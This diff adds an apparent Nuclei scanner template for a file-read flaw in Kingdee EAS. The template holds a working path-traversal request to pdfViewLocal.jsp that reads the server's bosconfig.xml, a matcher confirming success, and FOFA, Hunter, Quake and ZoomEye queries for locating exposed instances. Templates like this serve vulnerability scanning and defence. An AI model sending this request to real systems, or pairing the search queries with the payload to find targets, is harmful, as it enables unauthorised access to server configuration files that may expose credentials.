@@ -1,0 +1,35 @@
+id: kingdee-eas-pdfViewLocal-fileread
+
+info:
+  name: 金蝶 EAS pdfViewLocal.jsp - fileread
+  author: leadlife
+  severity: high
+  description: 金蝶天燕-ApusicServer-pdfviewlocal-文件读取
+  reference: 
+    - todo
+  metadata:
+    verified: true
+    fofa-query: body="easSessionId" || header="easportal" || header="eassso/login" || banner="eassso/login" || body="/eassso/common" || (title="EAS系统登录" && body="金蝶")
+    hunter-query: web.body="/eassso/images/"
+    quake-query: app:"金蝶-EAS"
+    zoomeye-query: app:"金蝶 EAS"
+  tags: kingdee,lfi,eas
+
+http:
+  - raw:
+      - |
+        GET /easweb/logout/../cp/dm/pdfViewLocal.jsp?path=../config/bosconfig.xml HTTP/1.1
+        Host: {{Hostname}}
+        Range: bytes=0-100
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.8
+        Accept: */*
+        User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0
+        Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
+        Connection: close
+        Cache-Control: max-age=0
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"xml","cacheLazyLoad")
